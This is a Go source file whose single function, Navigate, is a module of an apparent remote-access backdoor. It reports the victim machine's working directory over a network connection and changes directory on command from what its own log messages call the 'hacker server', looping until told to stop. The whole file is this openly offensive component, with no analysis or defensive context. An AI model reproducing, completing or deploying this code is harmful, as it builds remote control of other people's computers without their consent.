package move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// Navigate takes a connection and returns error
func Navigate(connection net.Conn) (err error) {
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println("[-] Cant get present directory")

	}
	fmt.Println(pwd)

	pwdraw := pwd + "\n"
	nbyte, err := connection.Write([]byte(pwdraw))
	fmt.Println("[+]", nbyte, " was written")
	CommandReader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		usrcmdraw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[+] Unable to read command ", err)
		}
		usrcmd := strings.TrimSuffix(usrcmdraw, "\n")
		usrcmdarg := strings.Split(usrcmd, " ")
		if len(usrcmdarg) > 1 {
			dir2move := usrcmdarg[1]
			err = os.Chdir(dir2move)
			if err != nil {
				fmt.Println("[-] Unable to change Directory Navigate() line32", err)
			}
		}
		if usrcmdraw == "stop\n" {
			loopControl = false
			break
		}
		pwd, err = os.Getwd()

		npwdbytes, err := connection.Write([]byte(pwd + "\n"))
		fmt.Println("{+} Pwd written to hacker server", npwdbytes)
	}

	return
}
